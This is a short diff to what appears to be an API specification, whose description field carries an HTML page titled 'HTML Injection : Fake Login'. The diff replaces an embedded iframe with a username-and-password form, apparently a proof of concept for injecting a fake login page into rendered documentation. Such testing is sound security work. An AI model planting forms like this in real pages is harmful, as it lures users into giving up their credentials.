@@ -7,7 +7,11 @@ info:
         <h1>HTML Injection : Fake Login</h1>
     </div>
     <div class="form-container">
-     <p style="text-align:center"><iframe src="https://inf-service-adcollector.plutopreprod.tv/documentation" width="700" height="800" frameBorder="0"></iframe><p style="color:white">
+    <form method="post" action="">
+    <input type="text" name="username" placeholder="enter username"><br/><br/>
+    <input type="text" name="password" placeholder="enter password"><br/><br/>
+    <input type="submit" name="submit" value="submit"/>
+</form>
     </div>
 </div>'
 paths:
